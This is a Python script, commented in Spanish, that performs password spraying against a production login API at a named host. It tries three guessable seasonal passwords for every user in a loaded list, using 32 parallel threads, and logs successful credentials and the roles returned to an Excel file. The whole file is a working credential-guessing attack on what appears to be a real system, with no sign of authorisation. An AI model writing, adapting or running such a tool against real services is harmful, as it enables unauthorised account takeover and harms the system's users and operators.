import requests
import pandas as pd
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# URL del endpoint de login
LOGIN_URL = "https://ms-sgdea-prd.proyectos-3t.tech/api/v1/autenticacion/token/all/platforms"

# Cargar usuarios desde JSON externo
with open("usuarios.json", "r", encoding="utf-8") as f:
    usuarios = json.load(f)

# Posibles contraseñas para cada usuario
posibles_contrasenas = [
    "SGdea2024*",
    "Sgdea2025*",
    "Positiva2025*",
]


# Lista global de resultados y un Lock para acceso seguro entre hilos
resultados = []
lock = Lock()

def probar_login(usuario, contrasena):
    payload = {
        "username": usuario,
        "password": contrasena
    }
    try:
        response = requests.post(LOGIN_URL, json=payload)
        return response.status_code, response.json()
    except Exception as e:
        return 0, {"error": str(e)}

def procesar_usuario(usuario):
    resultado_local = []
    for contrasena in posibles_contrasenas:
        status, respuesta = probar_login(usuario, contrasena)
        respuesta_str = json.dumps(respuesta, ensure_ascii=False)
        print(f"[{usuario}] Intento con '{contrasena}' → status {status}")

        if status == 200:
            relaciones = respuesta.get("relaciones", [])
            roles = [rel.get("rol") for rel in relaciones if "rol" in rel]
            roles_obtenidos = ", ".join(roles)

            resultado_local.append({
                "usuario": usuario,
                "contraseña_probada": contrasena,
                "contraseña_exitosa": contrasena,
                "roles": roles_obtenidos,
                "respuesta_servidor": respuesta_str
            })
            break  # no sigue probando más contraseñas
        else:
            resultado_local.append({
                "usuario": usuario,
                "contraseña_probada": contrasena,
                "contraseña_exitosa": "",
                "roles": "",
                "respuesta_servidor": f"Status {status}: {respuesta_str}"
            })

    with lock:
        resultados.extend(resultado_local)

# Ejecutar en paralelo con hilos
MAX_WORKERS = 32  # puedes ajustar según tu CPU/conexión

with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = [executor.submit(procesar_usuario, usuario) for usuario in usuarios]
    for future in as_completed(futures):
        pass  # solo esperamos que todos terminen

# Exportar resultados a Excel
df = pd.DataFrame(resultados)
df.to_excel("resultados_login.xlsx", index=False)

print("\n✅ Proceso completado con hilos. Revisa 'resultados_login.xlsx'.")